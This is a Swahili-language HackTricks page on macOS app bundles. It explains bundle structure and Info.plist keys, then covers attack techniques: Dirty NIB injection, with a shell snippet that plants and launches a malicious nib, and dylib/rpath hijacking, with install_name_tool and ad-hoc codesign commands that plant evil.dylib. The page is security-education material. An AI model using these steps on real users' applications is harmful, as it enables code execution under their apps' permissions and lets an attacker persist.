# Vifurushi vya macOS

{{#include ../../../banners/hacktricks-training.md}}

## Taarifa za Msingi

Bundles katika macOS hutumika kama kontena za rasilimali mbalimbali, zikiwemo applications, libraries, na mafaili mengine muhimu, na kuzifanya zionekane kama objects moja katika Finder, kama mafaili yanayojulikana ya `*.app`. Bundle inayopatikana mara nyingi ni `.app` bundle, ingawa aina nyingine kama `.framework`, `.systemextension`, na `.kext` pia hutumika sana.

### Vipengele Muhimu vya Bundle

Ndani ya bundle, hasa ndani ya directory ya `<application>.app/Contents/`, kuna rasilimali mbalimbali muhimu:

- **\_CodeSignature**: Directory hii huhifadhi maelezo ya code-signing muhimu kwa ajili ya kuthibitisha uadilifu wa application. Unaweza kukagua maelezo ya code-signing kwa kutumia commands kama vile:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Ina binary inayoweza kutekelezwa ya application inayotumika baada ya mtumiaji kuingiliana nayo.
- **Resources**: Hifadhi ya vipengele vya user interface vya application, ikiwemo picha, nyaraka, na maelezo ya interface (faili za nib/xib).
- **Info.plist**: Hufanya kazi kama faili kuu ya configuration ya application, na ni muhimu ili mfumo uweze kutambua na kuingiliana na application ipasavyo.

#### Important Keys in Info.plist

Faili ya `Info.plist` ni msingi wa configuration ya application, ikiwa na keys kama:

- **CFBundleExecutable**: Hubainisha jina la faili kuu inayoweza kutekelezwa iliyo katika directory ya `Contents/MacOS`.
- **CFBundleIdentifier**: Hutoa identifier ya kimataifa ya application, inayotumiwa sana na macOS kwa ajili ya application management.
- **LSMinimumSystemVersion**: Huonyesha toleo la chini kabisa la macOS linalohitajika ili application itumike.

### Exploring Bundles

Ili kuchunguza yaliyomo kwenye bundle, kama vile `Safari.app`, command ifuatayo inaweza kutumika: `bash ls -lR /Applications/Safari.app/Contents`

Uchunguzi huu huonyesha directories kama `_CodeSignature`, `MacOS`, `Resources`, na mafaili kama `Info.plist`, ambapo kila moja ina madhumuni yake maalum, kuanzia kulinda application hadi kufafanua user interface na operational parameters zake.

#### Additional Bundle Directories

Mbali na directories za kawaida, bundles zinaweza pia kuwa na:

- **Frameworks**: Ina frameworks zilizowekwa pamoja na application. Frameworks zinafanana na dylibs zilizo na resources za ziada.
- **PlugIns**: Directory ya plug-ins na extensions zinazoongeza uwezo wa application.
- **XPCServices**: Ina XPC services zinazotumiwa na application kwa ajili ya out-of-process communication.

Muundo huu huhakikisha kuwa vipengele vyote vinavyohitajika vimefungwa ndani ya bundle, na hivyo kuwezesha mazingira ya application yaliyo modular na salama.

Kwa maelezo zaidi kuhusu keys za `Info.plist` na maana zake, Apple developer documentation ina resources nyingi: [Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).<sup>[[3]](#references)</sup>

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Bundle yenye quarantine inapotekelezwa kwa mara ya kwanza, macOS hufanya deep signature verification na inaweza kuiendesha kutoka kwenye randomized translocated path. Baada ya kukubaliwa, launches zinazofuata hufanya shallow checks pekee; resource files katika `Resources/`, `PlugIns/`, nibs, n.k. hazikukaguliwa kihistoria. Tangu macOS 13 Ventura, deep check hutekelezwa wakati wa first run na ruhusa mpya ya *App Management* ya TCC huzuia third-party processes kurekebisha bundles nyingine bila idhini ya mtumiaji, lakini systems za zamani bado ziko vulnerable.
- **Bundle Identifier collisions**: Embedded targets nyingi (PlugIns, helper tools) zinapotumia tena `CFBundleIdentifier` ileile, zinaweza kuvuruga signature validation na mara nyingine kuwezesha URL-scheme hijacking/confusion. Kila mara enumerate sub-bundles na uthibitishe kuwa IDs ni za kipekee.

## Resource Hijacking (Dirty NIB / NIB Injection)

Kabla ya Ventura, kubadilisha UI resources katika signed app kulifanya iwezekane kupita shallow code signing na kupata code execution yenye entitlements za application. Utafiti wa sasa (2024) unaonyesha kuwa hii bado inafanya kazi kwenye pre-Ventura na builds ambazo hazina quarantine:<sup>[[1]](#references)[[2]](#references)</sup>

1. Copy target app hadi kwenye writable location (kwa mfano, `/tmp/Victim.app`).
2. Replace `Contents/Resources/MainMenu.nib` (au nib yoyote iliyotajwa katika `NSMainNibFile`) kwa malicious one inayoinstantiate `NSAppleScript`, `NSTask`, n.k.
3. Launch app. Malicious nib hutekelezwa chini ya bundle ID na entitlements za victim (TCC grants, microphone/camera, n.k.).
4. Ventura+ hupunguza hatari hii kwa kufanya deep-verifying ya bundle wakati wa first launch na kuhitaji ruhusa ya *App Management* kwa modifications zinazofuata, hivyo persistence huwa ngumu zaidi, lakini initial-launch attacks kwenye macOS za zamani bado zinatumika.<sup>[[1]](#references)</sup>

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking ndani ya Bundles

Kwa sababu utafutaji wa `@rpath` hupendelea Frameworks/PlugIns zilizomo ndani ya bundle, kuweka library hasidi ndani ya `Contents/Frameworks/` au `Contents/PlugIns/` kunaweza kuelekeza upya mpangilio wa upakiaji wakati binary kuu imesainiwa bila library validation au ikiwa na mpangilio dhaifu wa `LC_RPATH`.

Hatua za kawaida unapotumia vibaya bundle isiyosainiwa/ad-hoc:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Notes:
- Hardened runtime yenye `com.apple.security.cs.disable-library-validation` haipo huzuia third-party dylibs; kagua entitlements kwanza.
- XPC services zilizo chini ya `Contents/XPCServices/` mara nyingi hupakia sibling frameworks—patch binaries zao kwa njia hiyohiyo kwa persistence au privilege escalation paths.

## Cheatsheet ya Ukaguzi wa Haraka
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## Marejeo

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write-up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)
- [3] [Apple Developer - Apple Info.plist Key Reference](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html)

{{#include ../../../banners/hacktricks-training.md}}
